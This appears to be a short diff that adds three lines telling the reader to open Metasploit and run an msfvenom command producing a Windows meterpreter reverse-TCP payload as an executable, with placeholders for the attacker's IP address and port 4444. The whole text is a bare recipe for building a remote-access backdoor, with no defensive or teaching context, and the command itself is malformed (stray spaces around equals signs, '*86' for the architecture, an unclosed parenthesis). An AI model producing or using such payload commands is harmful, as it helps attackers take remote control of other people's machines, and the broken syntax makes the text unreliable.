@@ -1,0 +1,3 @@
+Open Metasploit
+then type the following commands
+msfvenom -p windows/meterpreter/reverse_tcp lhost = (YOUR IP ADDRESS) lport = 4444 -f exe -a *86 > (PAYLOAD_NAME.exe
